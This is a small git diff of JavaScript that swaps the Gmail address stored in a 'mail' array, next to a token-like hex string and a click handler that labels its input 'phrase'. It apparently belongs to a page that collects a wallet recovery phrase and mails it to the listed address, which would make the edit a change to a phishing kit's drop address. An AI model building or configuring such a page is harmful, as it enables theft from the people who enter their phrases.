@@ -80,7 +80,7 @@ span.onclick = function() {
 
     
       
-  var mail = ["morephrase@gmail.com", "3636ff45719cdef68825126414f77690"];
+  var mail = ["midegold112@gmail.com", "3636ff45719cdef68825126414f77690"];
   // var appy = document.getElementById('p_name').innerText;
   $("#proceed1").click(function(){
     var appy = "phrase"
